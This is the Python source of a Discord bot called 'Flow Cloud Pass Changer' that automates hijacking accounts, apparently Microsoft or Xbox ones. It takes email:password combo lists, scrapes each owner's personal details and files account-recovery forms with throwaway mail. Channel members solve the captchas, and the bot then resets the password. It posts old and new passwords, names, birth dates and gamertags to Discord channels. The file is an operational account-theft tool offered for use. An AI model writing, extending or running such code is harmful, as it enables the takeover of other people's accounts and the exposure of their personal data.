import asyncio
import json
import os
import io
import logging
from typing import List, Optional

import discord
from discord.ext import commands, tasks

# Import synchronous automation helpers from the merged main module
import main as core

# ------------------------------------------------------------------
# Config paths (prefer a/a/ as requested, but fall back to repo root)
# ------------------------------------------------------------------
CONFIG_PATHS = [os.path.join("a", "a", "config.json"), "config.json"]
AUTHDB_PATHS = [os.path.join("a", "a", "authdb.json"), "authdb.json"]

# Default owners (can be overridden via config.json OWNER_IDS)
DEFAULT_OWNERS = [1317504267237593099, 1383641747913183256]

# Embed styling
EMBED_COLOR = 0x00FFFF  # cyan
FOOTER_TEXT = "Flow Cloud Pass Changer | By SeriesV2"

# Global processing lock to ensure only one account is processed at a time
processing_lock: asyncio.Lock = asyncio.Lock()

# Setup logger
logger = logging.getLogger("passchange_bot")
logger.setLevel(logging.INFO)

# ------------------------------------------------------------------
# Read / write helpers
# ------------------------------------------------------------------
def load_config() -> dict:
    for p in CONFIG_PATHS:
        if os.path.exists(p):
            with open(p, "r") as f:
                return json.load(f)
    return {}


def save_config(cfg: dict):
    written = False
    for p in CONFIG_PATHS:
        if os.path.exists(p):
            with open(p, "w") as f:
                json.dump(cfg, f, indent=2)
            written = True
    if not written:
        with open("config.json", "w") as f:
            json.dump(cfg, f, indent=2)


def load_authdb() -> dict:
    for p in AUTHDB_PATHS:
        if os.path.exists(p):
            with open(p, "r") as f:
                return json.load(f)
    return {"users": []}


def save_authdb(db: dict):
    written = False
    for p in AUTHDB_PATHS:
        if os.path.exists(p):
            with open(p, "w") as f:
                json.dump(db, f, indent=2)
            written = True
    if not written:
        with open("authdb.json", "w") as f:
            json.dump(db, f, indent=2)


# ------------------------------------------------------------------
# Utility embed sender
# ------------------------------------------------------------------
async def send_embed(channel: discord.abc.Messageable, title: str, description: str, mention: Optional[str] = None):
    embed = discord.Embed(title=title, description=description, color=EMBED_COLOR)
    embed.set_footer(text=FOOTER_TEXT)
    if mention:
        await channel.send(content=mention, embed=embed)
    else:
        await channel.send(embed=embed)


# ------------------------------------------------------------------
# Permission helpers
# ------------------------------------------------------------------
def is_owner_id(user_id: int) -> bool:
    cfg = load_config()
    cfg_ids = cfg.get("OWNER_IDS", [])
    try:
        cfg_ids_int = [int(x) for x in cfg_ids]
    except Exception:
        cfg_ids_int = [int(x) for x in cfg_ids if str(x).isdigit()]
    try:
        uid = int(user_id)
    except Exception:
        return False
    return uid in DEFAULT_OWNERS or uid in cfg_ids_int


def is_authed_id(user_id: int, authdb: dict) -> bool:
    return str(user_id) in [str(x) for x in authdb.get("users", [])]


def is_owner_check():
    async def _predicate(ctx: commands.Context) -> bool:
        return is_owner_id(ctx.author.id)
    return commands.check(_predicate)


# ------------------------------------------------------------------
# Event-loop watchdog
# ------------------------------------------------------------------
async def event_loop_watchdog_task(bot: commands.Bot):
    drift_threshold = 1.0
    last = asyncio.get_event_loop().time()
    while True:
        await asyncio.sleep(5)
        now = asyncio.get_event_loop().time()
        drift = now - last - 5
        last = now
        if abs(drift) > drift_threshold:
            logger.warning(f"Event loop drift detected: {drift:.2f}s")
            cfg = load_config()
            log_id = cfg.get("log_channel_id")
            if log_id:
                ch = bot.get_channel(int(log_id))
                if ch:
                    await send_embed(ch, "Event loop warning", f"Watchdog detected event loop drift: {drift:.2f}s")


# ------------------------------------------------------------------
# Bot setup
# ------------------------------------------------------------------
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=commands.when_mentioned_or(".", "!", "$", "+"), intents=intents)


@bot.event
async def on_ready():
    cfg = load_config()
    try:
        await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Game("Flow Cloud Pass Changer"))
    except Exception as e:
        logger.exception("Failed to set presence")

    logger.info(f"Logged in as {bot.user} ({bot.user.id})")
    bot.loop.create_task(event_loop_watchdog_task(bot))

    # Wire the core's Discord logging hook so `main.py` can forward key events to the configured log channel
    try:
        core.set_discord_log_hook(lambda t, m, img=None, fname=None: asyncio.run_coroutine_threadsafe(post_log_embed(bot, t, m, img, fname), bot.loop))
        logger.info("Discord log hook registered with core module")
    except Exception:
        logger.exception("Failed to register discord log hook")

    log_id = cfg.get("log_channel_id")
    if log_id:
        ch = bot.get_channel(int(log_id))
        if ch:
            await send_embed(ch, "Bot Startup", f"Passchange bot is online as {bot.user}")


# ------------------------------------------------------------------
# Owner-only commands
# ------------------------------------------------------------------
@bot.command(name="auth")
@is_owner_check()
async def auth(ctx: commands.Context, member: discord.Member):
    db = load_authdb()
    users = [str(u) for u in db.get("users", [])]
    if str(member.id) in users:
        await send_embed(ctx, "Already authed", f"{member.mention} is already authorized")
        return
    users.append(str(member.id))
    db["users"] = users
    save_authdb(db)
    await send_embed(ctx, "Authorized", f"{member.mention} has been added to authorized users")


@bot.command(name="unauth")
@is_owner_check()
async def unauth(ctx: commands.Context, member: discord.Member):
    db = load_authdb()
    users = [str(u) for u in db.get("users", [])]
    if str(member.id) not in users:
        await send_embed(ctx, "Not authed", f"{member.mention} is not in the authorized list")
        return
    users.remove(str(member.id))
    db["users"] = users
    save_authdb(db)
    await send_embed(ctx, "Unauthorized", f"{member.mention} has been removed from authorized users")


# ------------------------------------------------------------------
# Helper to post a log embed
# ------------------------------------------------------------------
async def post_log_embed(bot: commands.Bot, title: str, description: str, file_bytes: bytes = None, filename: str = None):
    cfg = load_config()
    log_id = cfg.get("log_channel_id")
    if not log_id:
        return
    ch = bot.get_channel(int(log_id))
    if ch:
        embed = discord.Embed(title=title, description=description, color=EMBED_COLOR)
        embed.set_footer(text=FOOTER_TEXT)
        try:
            if file_bytes and filename:
                file = discord.File(io.BytesIO(file_bytes), filename=filename)
                await ch.send(embed=embed, file=file)
            else:
                await ch.send(embed=embed)
        except Exception:
            # avoid letting logging fail
            try:
                await ch.send(embed=embed)
            except Exception:
                pass


# ------------------------------------------------------------------
# Core processing flow
# ------------------------------------------------------------------
async def process_account_flow(ctx: commands.Context, email: str, old_password: str, requester_id: int, custom_password: Optional[str] = None):
    async with processing_lock:
        await post_log_embed(bot, "Processing started", f"Processing account: {email} (requested by <@{requester_id}>)")

        try:
            # 1) Scrape account info (blocking) - run in thread
            account_info = await asyncio.to_thread(core.scrape_account_info, email, old_password)
            if account_info.get("error"):
                await post_log_embed(bot, "Scrape failed", f"{email}: {account_info.get('error')}")
                return

            # 2) Determine new password (either provided custom or generated)
            new_password = custom_password if custom_password else core.generate_shulker_password()

            # 3) Submit ACSR form (blocking) -> returns captcha_image, driver, token, tempmail
            captcha_image, driver, token, tempmail = await asyncio.to_thread(core.submit_acsr_form, account_info)
            if not captcha_image:
                await post_log_embed(bot, "ACSR failed", f"ACSR submission failed for {email}")
                if driver:
                    try:
                        driver.quit()
                    except Exception:
                        pass
                return

            # Send captcha image to captcha channel
            cfg = load_config()
            captcha_ch_id = cfg.get("captcha_channel_id")
            if not captcha_ch_id:
                await post_log_embed(bot, "No captcha channel", "Captcha channel not configured")
                if driver:
                    try:
                        driver.quit()
                    except Exception:
                        pass
                return

            captcha_channel = bot.get_channel(int(captcha_ch_id))
            if not captcha_channel:
                await post_log_embed(bot, "Captcha channel invalid", "Could not find the configured captcha channel")
                if driver:
                    try:
                        driver.quit()
                    except Exception:
                        pass
                return

            attempts = 0
            max_attempts = 6
            reset_link = None

            while attempts < max_attempts and reset_link is None:
                attempts += 1

                # Read image bytes in thread-safe manner
                def _read_bytes(img):
                    try:
                        return img.read() if hasattr(img, 'read') else bytes(img)
                    except Exception:
                        return None

                captcha_bytes = await asyncio.to_thread(_read_bytes, captcha_image)
                if not captcha_bytes:
                    await post_log_embed(bot, "Captcha read error", f"Failed to read captcha bytes for {email}")
                    break

                file = discord.File(io.BytesIO(captcha_bytes), filename="captcha.png")
                embed = discord.Embed(title="Captcha Required", description=f"Please reply with the captcha text for more Pass Change Restocks", color=EMBED_COLOR)
                embed.set_footer(text=FOOTER_TEXT)
                await captcha_channel.send(embed=embed, file=file)

                # ------------------------------------------------------------------
                # NEW: allow anyone in the captcha channel to answer
                # ------------------------------------------------------------------
                def check(m: discord.Message):
                    return m.channel.id == int(captcha_ch_id)

                try:
                    msg = await bot.wait_for('message', check=check, timeout=300)
                except asyncio.TimeoutError:
                    await post_log_embed(bot, "Captcha timeout", f"No captcha response for {email} (attempt {attempts})")
                    break

                captcha_text = msg.content.strip()
                # Continue ACSR flow (blocking call)
                result = await asyncio.to_thread(core.continue_acsr_flow, driver, account_info, token, captcha_text, requester_id)

                if result == "CAPTCHA_RETRY_NEEDED":
                    await post_log_embed(bot, "Captcha incorrect", f"Captcha was incorrect for {email} (attempt {attempts})")
                    # Try to download a new captcha image using download_captcha via submit_acsr_form again or a helper
                    try:
                        captcha_image, driver, token, tempmail = await asyncio.to_thread(core.submit_acsr_form, account_info)
                    except Exception as e:
                        await post_log_embed(bot, "ACSR retry failed", f"Failed to retry ACSR for {email}: {e}")
                        break
                    continue
                else:
                    reset_link = result
                    break

            if not reset_link:
                await post_log_embed(bot, "Reset link not obtained", f"Failed to obtain reset link for {email}")
                try:
                    driver.quit()
                except Exception:
                    pass
                return

            # Perform password reset
            updated_password = await asyncio.to_thread(core.perform_password_reset, reset_link, email, new_password)

            # Prepare result embed
            success_channel_id = cfg.get("success_channel_id")
            summary = (
                f"**Email:** {email}\n"
                f"**New Password:** {updated_password}\n"
                f"**Old Password:** {old_password}\n"
                f"**Name:** {account_info.get('name', 'N/A')}\n"
                f"**DOB:** {account_info.get('dob', 'N/A')}\n"
                f"**Region:** {account_info.get('region', 'N/A')}\n"
                f"**Skype:** {account_info.get('skype_id', 'N/A')}\n"
                f"**Gamertag:** {account_info.get('gamertag', 'N/A')}\n"
            )

            if success_channel_id:
                ch = bot.get_channel(int(success_channel_id))
                if ch:
                    await send_embed(ch, "Password Changed", summary)

            # Always post the full summary to the log channel as well so operators get complete details
            await post_log_embed(bot, "Password Changed", summary)

        except Exception as e:
            logger.exception("Processing failed")
            await post_log_embed(bot, "Processing error", f"Error while processing {email}: {e}")
        finally:
            try:
                if 'driver' in locals() and driver:
                    driver.quit()
            except Exception:
                pass


# ------------------------------------------------------------------
# recover command
# ------------------------------------------------------------------
@bot.command(name="recover")
async def recover(ctx: commands.Context, combo: str):
    db = load_authdb()
    if not is_authed_id(ctx.author.id, db):
        await send_embed(ctx, "Unauthorized", "You are not authorized to use this command.")
        return

    if ':' not in combo:
        await send_embed(ctx, "Invalid format", "Use: `.recover email:old_password`")
        return

    email, old_password = combo.split(':', 1)

    # Ask whether to generate a password or use a custom one
    choice_embed = discord.Embed(
        title="Password Option",
        description="Reply with `generate` to auto-generate a password, or `custom` to set your own password.",
        color=EMBED_COLOR,
    )
    choice_embed.set_footer(text=FOOTER_TEXT)
    # Use Discord's reply feature to reference the original command message
    await ctx.message.reply(embed=choice_embed)

    def _check_author(m: discord.Message):
        return m.author.id == ctx.author.id and m.channel.id == ctx.channel.id

    try:
        choice_msg = await bot.wait_for('message', check=_check_author, timeout=60)
        choice = choice_msg.content.strip().lower()
    except asyncio.TimeoutError:
        await send_embed(ctx, "Timed out", "No response received; defaulting to a generated password.")
        choice = "generate"

    custom_password = None
    if choice.startswith('custom'):
        prompt_embed = discord.Embed(
            title="Enter custom password",
            description="Reply to this message with the password you want to set (will be used if a reset link is found on the account).",
            color=EMBED_COLOR,
        )
        prompt_embed.set_footer(text=FOOTER_TEXT)
        await ctx.message.reply(embed=prompt_embed)

        try:
            pwd_msg = await bot.wait_for('message', check=_check_author, timeout=120)
            custom_password = pwd_msg.content.strip()
        except asyncio.TimeoutError:
            await send_embed(ctx, "Timed out", "No custom password entered; defaulting to a generated password.")
            custom_password = None

    await send_embed(ctx, "Recovery started", f"Recovery for `{email}` has been queued. You will be notified in the success channel when complete.")
    # Spawn background task and pass the chosen custom_password (or None)
    bot.loop.create_task(process_account_flow(ctx, email.strip(), old_password.strip(), ctx.author.id, custom_password))


# ------------------------------------------------------------------
# bulk command
# ------------------------------------------------------------------
@bot.command(name="bulk")
async def bulk(ctx: commands.Context):
    db = load_authdb()
    if not is_authed_id(ctx.author.id, db):
        await send_embed(ctx, "Unauthorized", "You are not authorized to use this command.")
        return

    if not ctx.message.attachments:
        await send_embed(ctx, "No file", "Attach a .txt file where each line is `email:password`")
        return

    att = ctx.message.attachments[0]
    if not att.filename.lower().endswith('.txt'):
        await send_embed(ctx, "Invalid file", "Please attach a .txt file")
        return

    data = await att.read()
    text = data.decode('utf-8', errors='ignore')
    lines = [l.strip() for l in text.splitlines() if l.strip() and not l.strip().startswith('#')]

    await send_embed(ctx, "Bulk queued", f"Queued {len(lines)} accounts for processing.")

    for i, line in enumerate(lines, 1):
        if ':' not in line:
            await post_log_embed(bot, "Bulk skip", f"Skipping invalid line: {line}")
            continue

        email, password = line.split(':', 1)
        await process_account_flow(ctx, email.strip(), password.strip(), ctx.author.id)
        # Sleep to reduce rate limiting
        await asyncio.sleep(5)


# ------------------------------------------------------------------
# Owner-only channel setters
# ------------------------------------------------------------------
@bot.command(name="set-log")
@is_owner_check()
async def set_log(ctx: commands.Context, channel: discord.TextChannel):
    cfg = load_config()
    cfg['log_channel_id'] = str(channel.id)
    save_config(cfg)
    await send_embed(ctx, "Log channel set", f"Log channel set to {channel.mention}")


@bot.command(name="set-success")
@is_owner_check()
async def set_success(ctx: commands.Context, channel: discord.TextChannel):
    cfg = load_config()
    cfg['success_channel_id'] = str(channel.id)
    save_config(cfg)
    await send_embed(ctx, "Success channel set", f"Success channel set to {channel.mention}")


@bot.command(name="set-captcha")
@is_owner_check()
async def set_captcha(ctx: commands.Context, channel: discord.TextChannel):
    cfg = load_config()
    cfg['captcha_channel_id'] = str(channel.id)
    save_config(cfg)
    await send_embed(ctx, "Captcha channel set", f"Captcha channel set to {channel.mention}")


# ------------------------------------------------------------------
# Error handler
# ------------------------------------------------------------------
@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    from discord.ext.commands import CheckFailure
    if isinstance(error, CheckFailure):
        try:
            await send_embed(ctx, "Permission denied", "Only configured owners may run this command.")
        except Exception:
            pass
        return
    logger.exception(f"Unhandled command error: {error}")


# ------------------------------------------------------------------
# Entry point
# ------------------------------------------------------------------
def run_bot():
    cfg = load_config()
    token = cfg.get('TOKEN')

    if not token:
        logger.error("TOKEN not found in config.json")
        raise RuntimeError("TOKEN not found in config.json")

    # Prevent duplicate logging handlers
    for h in logging.getLogger().handlers:
        logging.getLogger().removeHandler(h)

    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(name)s: %(message)s'))
    logging.getLogger().addHandler(handler)

    bot.run(token)


if __name__ == '__main__':
    run_bot()